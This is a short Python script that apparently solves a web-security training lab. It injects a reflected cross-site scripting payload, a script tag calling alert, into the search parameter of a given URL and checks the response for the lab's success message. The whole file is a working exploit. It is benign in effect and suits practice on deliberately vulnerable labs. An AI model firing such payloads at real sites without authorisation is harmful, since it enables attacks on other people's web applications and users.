import requests
import urllib3
import sys
  #Disabling warnings
urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
 
def execute_XSS(s, url):
    vuln_url = url + '?search=<script>alert("XSS")<%2Fscript>'
    r = s.post(vuln_url)
    res = r.text
    if 'Congratulations, you solved the lab!' in res:
        print("(+) XSS payload successfull")
    else:
        print("(-) XSS payload failed")
        print(res)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.session()
    url = sys.argv[1]
    execute_XSS(s, url)
if __name__ == '__main__':
    main()